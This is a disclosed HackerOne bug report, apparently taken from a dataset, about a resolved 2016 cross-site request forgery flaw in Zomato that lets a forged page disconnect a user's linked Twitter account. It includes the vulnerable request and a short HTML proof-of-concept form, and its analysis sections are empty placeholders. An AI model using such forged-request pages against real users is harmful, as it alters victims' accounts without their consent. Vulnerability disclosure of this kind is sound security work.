---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '114127'
original_report_id: '114127'
title: Twitter Disconnect CSRF
weakness: Cross-Site Request Forgery (CSRF)
team_handle: zomato
created_at: '2016-02-02T14:11:44.905Z'
disclosed_at: '2016-09-30T11:18:01.605Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 9
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Twitter Disconnect CSRF

## Metadata

- HackerOne Report ID: 114127
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: zomato
- Disclosed At: 2016-09-30T11:18:01.605Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Hi**

Using this CSRF vulnerability one could disconnect  Twitter account from their profiles.

**Vulnerable request**
~~~
GET /php/disconnect_twitter_profile.php HTTP/1.1
Host: www.zomato.com
Connection: keep-alive
Accept: text/html, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36
Referer: https://www.zomato.com/
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-US,en;q=0.8
X-dotNet-Beautifier: 668; DO-NOT-REMOVE
~~~
**POC Code**
~~~
<html>
<body>
<form action="https://www.zomato.com/php/disconnect_twitter_profile.php">
 <input type="submit" value="disconnect" />
</form>
</body>
</html>
~~~

**Steps to reproduce**

* Add  Account Twitter  
* Connect to your twitter account
* Use the above poc code to disconnect the twitter account

**Regards**
**Husssain**

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
